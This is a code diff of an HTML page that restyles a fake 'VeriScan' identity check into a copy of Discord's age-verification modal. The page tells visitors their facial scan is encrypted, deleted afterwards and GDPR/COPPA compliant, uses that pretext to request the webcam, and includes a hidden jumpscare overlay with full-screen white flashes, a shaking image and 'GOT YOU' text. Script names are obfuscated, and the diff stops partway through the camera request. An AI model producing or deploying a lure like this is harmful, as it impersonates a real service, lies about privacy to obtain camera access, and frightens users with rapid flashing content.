@@ -2,274 +2,826 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VeriScan — Identity Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord — Age Verification</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap');
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
 
         :root {
-            --p: #6366f1;
-            --pd: #4f46e5;
-            --a: #8b5cf6;
-            --ok: #10b981;
-            --err: #ef4444;
-            --bg: #030712;
-            --sf: rgba(17, 24, 39, 0.8);
-            --bd: rgba(255, 255, 255, 0.08);
-            --tx: #f9fafb;
-            --tx2: #9ca3af;
+            --bg: #313338;
+            --bg-secondary: #2b2d31;
+            --bg-tertiary: #1e1f22;
+            --text-normal: #dbdee1;
+            --text-muted: #949ba4;
+            --text-link: #00a8fc;
+            --brand: #5865f2;
+            --brand-hover: #4752c4;
+            --brand-active: #3c45a5;
+            --danger: #da373c;
+            --success: #248046;
+            --warning: #f0b232;
+            --border: rgba(255,255,255,0.08);
+            --input-bg: #1e1f22;
         }
 
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
             background: var(--bg);
-            color: var(--tx);
+            color: var(--text-normal);
             min-height: 100vh;
+            min-height: 100dvh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
         }
 
-        .bg { position: fixed; inset: 0; z-index: 0; }
-        .bg::before {
+        /* subtle background pattern like discord */
+        body::before {
             content: '';
-            position: absolute;
+            position: fixed;
             inset: 0;
             background: 
-                radial-gradient(ellipse at 20% 20%, rgba(99,102,241,0.15) 0%, transparent 50%),
-                radial-gradient(ellipse at 80% 80%, rgba(139,92,246,0.1) 0%, transparent 50%);
-        }
-        .grid {
-            position: absolute; inset: 0;
-            background-image: 
-                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
-            background-size: 60px 60px;
-            mask-image: radial-gradient(ellipse at center, black 30%, transparent 70%);
+                radial-gradient(ellipse at 0% 0%, rgba(88,101,242,0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at 100% 100%, rgba(88,101,242,0.02) 0%, transparent 50%);
+            pointer-events: none;
         }
 
-        .wrap {
-            position: relative; z-index: 1;
-            min-height: 100vh;
-            display: flex; align-items: center; justify-content: center;
-            padding: 20px;
+        .modal {
+            width: 100%;
+            max-width: 440px;
+            background: var(--bg-secondary);
+            border-radius: 8px;
+            box-shadow: 0 12px 24px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.04);
+            overflow: hidden;
+            animation: modalIn 0.25s ease-out;
+            max-height: 90vh;
+            max-height: 90dvh;
+            display: flex;
+            flex-direction: column;
         }
 
-        .card {
-            width: 100%; max-width: 480px;
-            background: var(--sf);
-            backdrop-filter: blur(20px);
-            border: 1px solid var(--bd);
-            border-radius: 24px;
-            padding: 48px;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), 0 0 100px rgba(99,102,241,0.1);
-            animation: cin 0.6s cubic-bezier(0.16,1,0.3,1);
-        }
-
-        @keyframes cin {
-            from { opacity: 0; transform: translateY(30px) scale(0.96); }
+        @keyframes modalIn {
+            from { opacity: 0; transform: scale(0.98) translateY(4px); }
             to { opacity: 1; transform: none; }
         }
 
-        .brand { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 32px; }
-        .bicon {
-            width: 48px; height: 48px;
-            background: linear-gradient(135deg, var(--p), var(--a));
-            border-radius: 14px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 24px;
-            box-shadow: 0 8px 24px rgba(99,102,241,0.4);
-        }
-        .bname {
-            font-size: 20px; font-weight: 700;
-            background: linear-gradient(135deg, #fff, #a5b4fc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        /* header */
+        .header {
+            padding: 20px 20px 0;
+            text-align: center;
+            position: relative;
         }
 
-        .badge {
-            display: inline-flex; align-items: center; gap: 6px;
-            padding: 6px 14px;
-            background: rgba(239,68,68,0.1);
-            border: 1px solid rgba(239,68,68,0.2);
-            border-radius: 100px;
-            font-size: 12px; font-weight: 600; color: #fca5a5;
+        .header h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-normal);
+            margin-bottom: 8px;
+            letter-spacing: -0.2px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: none;
+            background: transparent;
+            color: var(--text-muted);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: color 0.15s, background 0.15s;
+        }
+
+        .close-btn:hover {
+            color: var(--text-normal);
+            background: rgba(255,255,255,0.06);
+        }
+
+        /* content */
+        .content {
+            padding: 0 20px 20px;
+            overflow-y: auto;
+            flex: 1;
+        }
+
+        /* age gate badge */
+        .age-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(218,55,60,0.1);
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            width: fit-content;
+        }
+
+        .age-badge svg {
+            width: 16px;
+            height: 16px;
+            color: var(--danger);
+        }
+
+        .age-badge span {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--danger);
+        }
+
+        /* steps indicator - discord style */
+        .steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
             margin-bottom: 24px;
+            padding: 0 20px;
         }
-        .bdot { width: 6px; height: 6px; background: var(--err); border-radius: 50%; animation: pdot 2s infinite; }
-        @keyframes pdot { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
 
-        h1 { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 12px; letter-spacing: -0.5px; }
-        .sub { font-size: 15px; color: var(--tx2); text-align: center; line-height: 1.6; margin-bottom: 32px; }
-
-        .steps { display: flex; justify-content: center; gap: 8px; margin-bottom: 32px; }
-        .sdot { width: 8px; height: 8px; border-radius: 50%; background: rgba(255,255,255,0.1); transition: all 0.3s; }
-        .sdot.on { background: var(--p); width: 32px; border-radius: 4px; }
-        .sdot.done { background: var(--ok); }
-
-        .ibox {
-            background: rgba(99,102,241,0.05);
-            border: 1px solid rgba(99,102,241,0.15);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 24px;
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .ibox h3 { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 600; color: #a5b4fc; margin-bottom: 12px; }
-        .ilist { list-style: none; }
-        .ilist li { display: flex; gap: 10px; font-size: 13px; color: var(--tx2); padding: 4px 0; line-height: 1.5; }
-        .ilist li::before { content: '✓'; color: var(--ok); font-weight: 700; }
 
+        .step-circle {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: var(--bg-tertiary);
+            border: 2px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            transition: all 0.2s;
+            flex-shrink: 0;
+        }
+
+        .step.active .step-circle {
+            background: var(--brand);
+            border-color: var(--brand);
+            color: #fff;
+        }
+
+        .step.done .step-circle {
+            background: var(--success);
+            border-color: var(--success);
+            color: #fff;
+        }
+
+        .step-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-muted);
+            white-space: nowrap;
+        }
+
+        .step.active .step-label {
+            color: var(--text-normal);
+        }
+
+        .step.done .step-label {
+            color: var(--success);
+        }
+
+        .step-line {
+            width: 32px;
+            height: 2px;
+            background: var(--border);
+            margin: 0 8px;
+        }
+
+        .step-line.done {
+            background: var(--success);
+        }
+
+        /* info box */
+        .info-box {
+            background: var(--bg-tertiary);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .info-box h3 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-normal);
+            margin-bottom: 12px;
+        }
+
+        .info-box h3 svg {
+            width: 18px;
+            height: 18px;
+            color: var(--brand);
+        }
+
+        .info-list {
+            list-style: none;
+        }
+
+        .info-list li {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 13px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            padding: 3px 0;
+        }
+
+        .info-list li svg {
+            width: 16px;
+            height: 16px;
+            color: var(--success);
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        /* scan area */
+        .scan-container {
+            position: relative;
+            width: 240px;
+            height: 240px;
+            margin: 0 auto 20px;
+        }
+
+        .scan-circle {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            overflow: hidden;
+            background: #000;
+            border: 3px solid var(--border);
+        }
+
+        .scan-circle video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .scan-overlay {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .scan-corners {
+            position: absolute;
+            inset: -6px;
+            border-radius: 50%;
+        }
+
+        .scan-corners::before,
+        .scan-corners::after {
+            content: '';
+            position: absolute;
+            width: 32px;
+            height: 32px;
+            border-color: var(--brand);
+            border-style: solid;
+        }
+
+        .scan-corners::before {
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            border-width: 3px 0 0 0;
+            border-radius: 50% 50% 0 0;
+        }
+
+        .scan-corners::after {
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            border-width: 0 0 3px 0;
+            border-radius: 0 0 50% 50%;
+        }
+
+        .scan-line {
+            position: absolute;
+            left: 15%;
+            right: 15%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--brand), transparent);
+            box-shadow: 0 0 12px var(--brand);
+            animation: scanline 2.5s ease-in-out infinite;
+            border-radius: 2px;
+        }
+
+        @keyframes scanline {
+            0%, 100% { top: 25%; opacity: 0; }
+            15%, 85% { opacity: 1; }
+            50% { top: 75%; }
+        }
+
+        .scan-status {
+            position: absolute;
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 4px 12px;
+            background: var(--bg-tertiary);
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            white-space: nowrap;
+            border: 1px solid var(--border);
+        }
+
+        .scan-status.detecting {
+            color: var(--brand);
+            border-color: rgba(88,101,242,0.3);
+        }
+
+        .scan-status.error {
+            color: var(--danger);
+            border-color: rgba(218,55,60,0.3);
+        }
+
+        .scan-status.success {
+            color: var(--success);
+            border-color: rgba(36,128,70,0.3);
+        }
+
+        /* status text */
+        .status-text {
+            text-align: center;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 20px;
+            margin-bottom: 16px;
+            color: var(--text-muted);
+        }
+
+        .status-text.error {
+            color: var(--danger);
+        }
+
+        .status-text.success {
+            color: var(--success);
+        }
+
+        .status-text.loading {
+            color: var(--brand);
+        }
+
+        /* buttons - discord style */
         .btn {
-            width: 100%; padding: 16px 24px;
-            border: none; border-radius: 14px;
-            font-family: inherit; font-size: 15px; font-weight: 600;
-            cursor: pointer; transition: all 0.2s;
+            width: 100%;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 6px;
+            font-family: inherit;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
-        .bp { background: linear-gradient(135deg, var(--p), var(--pd)); color: #fff; box-shadow: 0 4px 20px rgba(99,102,241,0.3); }
-        .bp:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(99,102,241,0.5); }
-        .bs { background: rgba(255,255,255,0.05); color: var(--tx2); border: 1px solid var(--bd); margin-top: 12px; }
 
-        .scan { position: relative; width: 260px; height: 260px; margin: 0 auto 28px; }
-        .scirc { position: absolute; inset: 0; border-radius: 50%; overflow: hidden; background: #000; border: 2px solid rgba(255,255,255,0.1); }
-        .scirc video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .sframe { position: absolute; inset: -4px; border-radius: 50%; border: 3px solid transparent; border-top-color: var(--p); border-right-color: var(--p); animation: spin 1.5s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .sline { position: absolute; left: 10%; right: 10%; height: 2px; background: linear-gradient(90deg, transparent, var(--p), transparent); box-shadow: 0 0 20px var(--p); animation: sl 2s ease-in-out infinite; }
-        @keyframes sl { 0%,100% { top: 20%; opacity: 0; } 10%,90% { opacity: 1; } 50% { top: 80%; } }
-        .sglow { position: absolute; inset: -20px; border-radius: 50%; background: radial-gradient(circle, rgba(99,102,241,0.2) 0%, transparent 70%); animation: glow 2s ease-in-out infinite; }
-        @keyframes glow { 0%,100% { opacity: 0.5; } 50% { opacity: 1; } }
-
-        .st { text-align: center; font-size: 15px; min-height: 24px; margin-bottom: 20px; font-weight: 500; }
-        .st.err { color: var(--err); }
-        .st.ok { color: var(--ok); }
-        .st.ld { color: var(--p); }
-        .dots::after { content: ''; animation: dt 1.5s steps(4) infinite; }
-        @keyframes dt { 0%{content:'';} 25%{content:'.';} 50%{content:'..';} 75%{content:'...';} }
-
-        .lring { width: 80px; height: 80px; margin: 0 auto 24px; position: relative; }
-        .lring svg { width: 100%; height: 100%; animation: spin 1s linear infinite; }
-        .lring circle { fill: none; stroke: var(--p); stroke-width: 3; stroke-linecap: round; stroke-dasharray: 60 40; }
-        .cicon { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 32px; color: var(--ok); animation: cin 0.5s; }
-
-        .foot { margin-top: 32px; text-align: center; }
-        .tb { display: flex; justify-content: center; gap: 16px; margin-bottom: 16px; }
-        .tbb { display: flex; align-items: center; gap: 4px; font-size: 11px; color: var(--tx2); }
-        .ft { font-size: 11px; color: #4b5563; line-height: 1.6; }
-
-        .hidden { display: none !important; }
-
-        .scare { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; flex-direction: column; }
-        .scare.on { display: flex; animation: sin 0.1s; }
-        @keyframes sin { from { opacity: 0; } to { opacity: 1; } }
-        .simg { max-width: 95vw; max-height: 85vh; animation: vshake 0.08s infinite; filter: contrast(1.2) brightness(1.1); }
-        @keyframes vshake {
-            0% { transform: translate(0,0) scale(1); }
-            20% { transform: translate(-15px,8px) scale(1.08); }
-            40% { transform: translate(12px,-10px) scale(1.12); }
-            60% { transform: translate(-8px,12px) scale(1.06); }
-            80% { transform: translate(10px,-6px) scale(1.1); }
-            100% { transform: translate(0,0) scale(1); }
+        .btn-primary {
+            background: var(--brand);
+            color: #fff;
         }
-        .flash { position: fixed; inset: 0; background: #fff; z-index: 10000; pointer-events: none; opacity: 0; }
-        .flash.on { opacity: 1; }
-        .jtext {
-            color: #ff0000; font-size: 80px; font-weight: 900; text-align: center; margin-top: 30px;
-            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 3px 3px 0 #000;
-            animation: jpulse 0.25s infinite; font-family: 'Impact', sans-serif; letter-spacing: 8px;
-        }
-        @keyframes jpulse { 0%,100% { transform: scale(1) rotate(-2deg); } 50% { transform: scale(1.3) rotate(2deg); } }
 
-        @media (max-width: 520px) {
-            .card { padding: 32px 24px; }
-            h1 { font-size: 24px; }
-            .scan { width: 220px; height: 220px; }
+        .btn-primary:hover {
+            background: var(--brand-hover);
+        }
+
+        .btn-primary:active {
+            background: var(--brand-active);
+        }
+
+        .btn-primary:disabled {
+            background: var(--brand);
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--text-muted);
+            margin-top: 8px;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.04);
+            color: var(--text-normal);
+        }
+
+        .btn-link {
+            background: none;
+            border: none;
+            color: var(--text-link);
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 0;
+            margin-top: 12px;
+        }
+
+        .btn-link:hover {
+            text-decoration: underline;
+        }
+
+        /* loading */
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 0;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .spinner::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: var(--brand);
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .check-icon {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--success);
+            animation: checkIn 0.4s ease-out;
+        }
+
+        @keyframes checkIn {
+            from { transform: scale(0); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-normal);
+            margin-bottom: 8px;
+        }
+
+        .loading-sub {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .dots::after {
+            content: '';
+            animation: dots 1.5s steps(4) infinite;
+        }
+
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+        }
+
+        /* footer */
+        .footer {
+            padding: 16px 20px;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 8px;
+        }
+
+        .footer-links a {
+            font-size: 12px;
+            color: var(--text-link);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* hidden */
+        .hidden {
+            display: none !important;
+        }
+
+        /* scary overlay */
+        .scare {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .scare.on {
+            display: flex;
+            animation: scareIn 0.05s;
+        }
+
+        @keyframes scareIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .scare-img {
+            max-width: 100vw;
+            max-height: 100vh;
+            animation: violent-shake 0.06s infinite;
+            filter: contrast(1.3) brightness(1.1) saturate(1.2);
+        }
+
+        @keyframes violent-shake {
+            0% { transform: translate(0,0) scale(1) rotate(0deg); }
+            20% { transform: translate(-20px,10px) scale(1.1) rotate(-3deg); }
+            40% { transform: translate(15px,-12px) scale(1.15) rotate(3deg); }
+            60% { transform: translate(-10px,15px) scale(1.08) rotate(-2deg); }
+            80% { transform: translate(12px,-8px) scale(1.12) rotate(2deg); }
+            100% { transform: translate(0,0) scale(1) rotate(0deg); }
+        }
+
+        .flash {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 10000;
+            pointer-events: none;
+            opacity: 0;
+        }
+
+        .flash.on {
+            opacity: 1;
+        }
+
+        .scare-text {
+            position: absolute;
+            bottom: 60px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: #ff0000;
+            font-size: 72px;
+            font-weight: 900;
+            font-family: 'Impact', 'Arial Black', sans-serif;
+            letter-spacing: 6px;
+            text-shadow: 
+                0 0 20px #ff0000,
+                0 0 40px #ff0000,
+                0 0 60px #ff0000,
+                4px 4px 0 #000;
+            animation: scarePulse 0.2s infinite;
+        }
+
+        @keyframes scarePulse {
+            0%, 100% { transform: scale(1) rotate(-2deg); opacity: 1; }
+            50% { transform: scale(1.4) rotate(2deg); opacity: 0.9; }
+        }
+
+        /* mobile adjustments */
+        @media (max-width: 480px) {
+            .modal {
+                max-width: 100%;
+                height: 100%;
+                max-height: 100%;
+                border-radius: 0;
+            }
+
+            .scan-container {
+                width: 200px;
+                height: 200px;
+            }
+
+            .step-label {
+                display: none;
+            }
+
+            .step-line {
+                width: 20px;
+            }
         }
     </style>
 </head>
 <body>
 
-<div class="bg"><div class="grid"></div></div>
+<div class="modal">
+    <div class="header">
+        <button class="close-btn" onclick="go(1)">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M18.4 4L12 10.4 5.6 4 4 5.6 10.4 12 4 18.4 5.6 20 12 13.6 18.4 20 20 18.4 13.6 12 20 5.6 18.4 4Z"/>
+            </svg>
+        </button>
+        <h2>Age Verification</h2>
+        <p>This channel contains age-restricted content. You must verify your identity to continue.</p>
+    </div>
 
-<div class="wrap">
-    <div class="card">
-        <div class="brand">
-            <div class="bicon">🛡️</div>
-            <div class="bname">VeriScan</div>
+    <div class="steps" id="stepsBar">
+        <div class="step active" id="step1">
+            <div class="step-circle">1</div>
+            <span class="step-label">Consent</span>
         </div>
-
-        <div style="text-align:center;">
-            <div class="badge"><div class="bdot"></div>RESTRICTED — 18+ ONLY</div>
+        <div class="step-line" id="line1"></div>
+        <div class="step" id="step2">
+            <div class="step-circle">2</div>
+            <span class="step-label">Camera</span>
         </div>
-
-        <h1>Identity Verification</h1>
-        <p class="sub">Federal law requires identity verification before accessing restricted content.</p>
-
-        <div class="steps">
-            <div class="sdot on" id="d1"></div>
-            <div class="sdot" id="d2"></div>
-            <div class="sdot" id="d3"></div>
-            <div class="sdot" id="d4"></div>
+        <div class="step-line" id="line2"></div>
+        <div class="step" id="step3">
+            <div class="step-circle">3</div>
+            <span class="step-label">Scan</span>
         </div>
+        <div class="step-line" id="line3"></div>
+        <div class="step" id="step4">
+            <div class="step-circle">4</div>
+            <span class="step-label">Verify</span>
+        </div>
+    </div>
 
+    <div class="content">
+        <!-- step 1: consent -->
         <div id="s1">
-            <div class="ibox">
-                <h3><span>📷</span> Camera Access Required</h3>
-                <ul class="ilist">
-                    <li>Facial scan confirms you are 18 or older</li>
-                    <li>Data encrypted with AES-256</li>
-                    <li>Automatically deleted after verification</li>
-                    <li>Compliant with COPPA and GDPR</li>
+            <div class="age-badge">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+                </svg>
+                <span>18+ Content Warning</span>
+            </div>
+
+            <div class="info-box">
+                <h3>
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                    </svg>
+                    Privacy & Security
+                </h3>
+                <ul class="info-list">
+                    <li>
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                        Facial scan confirms you are 18 or older
+                    </li>
+                    <li>
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                        Data encrypted with AES-256
+                    </li>
+                    <li>
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                        Automatically deleted after verification
+                    </li>
+                    <li>
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                        Compliant with COPPA and GDPR
+                    </li>
                 </ul>
             </div>
-            <div class="st">Ready to begin verification</div>
-            <button class="btn bp" onclick="go(2)">Continue to Verification</button>
+
+            <div class="status-text">By continuing, you agree to the facial verification process.</div>
+
+            <button class="btn btn-primary" onclick="go(2)">
+                Continue to Verification
+            </button>
+            <button class="btn btn-secondary" onclick="go(1)">Cancel</button>
         </div>
 
+        <!-- step 2: camera permission -->
         <div id="s2" class="hidden">
-            <div class="ibox" style="background:rgba(245,158,11,0.05);border-color:rgba(245,158,11,0.2);">
-                <h3 style="color:#fbbf24;"><span>⚠️</span> Permission Required</h3>
-                <p style="font-size:13px;color:var(--tx2);line-height:1.7;">
-                    Your browser will now request camera access.<br><br>
-                    Please click <strong style="color:#fff;">"Allow"</strong> when prompted.
+            <div class="info-box" style="background: rgba(240,178,50,0.08); border: 1px solid rgba(240,178,50,0.2);">
+                <h3 style="color: var(--warning);">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+                    </svg>
+                    Camera Permission Required
+                </h3>
+                <p style="font-size: 13px; color: var(--text-muted); line-height: 1.6;">
+                    We need access to your camera to perform the facial scan. Your browser will ask for permission — please click <strong style="color: var(--text-normal);">"Allow"</strong> when prompted.
                 </p>
             </div>
-            <div class="st ld">Waiting for permission...</div>
-            <button class="btn bp" onclick="cam()">Allow Camera Access</button>
-            <button class="btn bs" onclick="go(1)">Back</button>
+
+            <div class="status-text loading">Waiting for camera access...</div>
+
+            <button class="btn btn-primary" onclick="cam()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 15.2c1.77 0 3.2-1.43 3.2-3.2s-1.43-3.2-3.2-3.2-3.2 1.43-3.2 3.2 1.43 3.2 3.2 3.2zM9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
+                </svg>
+                Allow Camera Access
+            </button>
+            <button class="btn btn-secondary" onclick="go(1)">Back</button>
         </div>
 
+        <!-- step 3: scanning -->
         <div id="s3" class="hidden">
-            <div class="scan">
-                <div class="sglow"></div>
-                <div class="scirc"><video id="v" autoplay playsinline muted></video></div>
-                <div class="sframe"></div>
-                <div class="sline"></div>
+            <div class="scan-container">
+                <div class="scan-circle">
+                    <video id="v" autoplay playsinline muted></video>
+                </div>
+                <div class="scan-corners"></div>
+                <div class="scan-line"></div>
+                <div class="scan-status detecting" id="scanBadge">Detecting...</div>
             </div>
-            <div class="st" id="ss">Position your face fully in the circle</div>
+
+            <div class="status-text" id="ss">Position your face fully in the circle</div>
         </div>
 
+        <!-- step 4: loading -->
         <div id="s4" class="hidden">
-            <div class="lring">
-                <svg viewBox="0 0 50 50"><circle cx="25" cy="25" r="20"></circle></svg>
-                <div class="cicon">✓</div>
+            <div class="loading-container">
+                <div class="spinner">
+                    <div class="check-icon">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="loading-text">Verification Complete</div>
+                <div class="loading-sub dots">Loading your content</div>
             </div>
-            <div class="st ld dots" style="font-size:18px;">Done. Loading</div>
         </div>
+    </div>
 
-        <div class="foot">
-            <div class="tb">
-                <div class="tbb">🔒 SSL Secure</div>
-                <div class="tbb">✓ GDPR Compliant</div>
-                <div class="tbb">🛡️ ISO 27001</div>
-            </div>
-            <p class="ft">© 2024 VeriScan Technologies<br>Processed per 18 U.S.C. § 2257</p>
+    <div class="footer">
+        <div class="footer-text">
+            Protected by VeriScan™ Identity Services
+        </div>
+        <div class="footer-links">
+            <a href="#" onclick="return false;">Privacy Policy</a>
+            <a href="#" onclick="return false;">Terms of Service</a>
+            <a href="#" onclick="return false;">Help Center</a>
         </div>
     </div>
 </div>
 
+<!-- jumpscare -->
 <div class="scare" id="scare">
-    <img class="simg" id="si" src="" alt="">
-    <div class="jtext">GOT YOU</div>
+    <img class="scare-img" id="si" src="" alt="">
+    <div class="scare-text">GOT YOU</div>
 </div>
 <div class="flash" id="fl"></div>
 
@@ -307,92 +859,130 @@ async function _0x0d1e() {
 }
 
 function go(s) {
-    document.getElementById('s' + s).classList.remove('hidden');
+    // hide all steps
     [1,2,3,4].forEach(i => {
-        if (i !== s) document.getElementById('s' + i).classList.add('hidden');
-        const d = document.getElementById('d' + i);
-        d.className = 'sdot' + (i < s ? ' done' : i === s ? ' on' : '');
+        document.getElementById('s' + i).classList.add('hidden');
     });
+    document.getElementById('s' + s).classList.remove('hidden');
+
+    // update step indicators
+    [1,2,3,4].forEach(i => {
+        const step = document.getElementById('step' + i);
+        const line = document.getElementById('line' + i);
+        
+        step.className = 'step';
+        if (line) line.className = 'step-line';
+        
+        if (i < s) {
+            step.classList.add('done');
+            if (line) line.classList.add('done');
+        } else if (i === s) {
+            step.classList.add('active');
+        }
+    });
+
     _0x5e6f = s;
 }
 
 async function cam() {
-    const st = document.querySelector('#s2 .st');
+    const st = document.querySelector('#s2 .status-text');
     st.textContent = 'Requesting camera access...';
+    st.className = 'status-text loading';
+
     try {
         _0x3c4d = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            video: { 
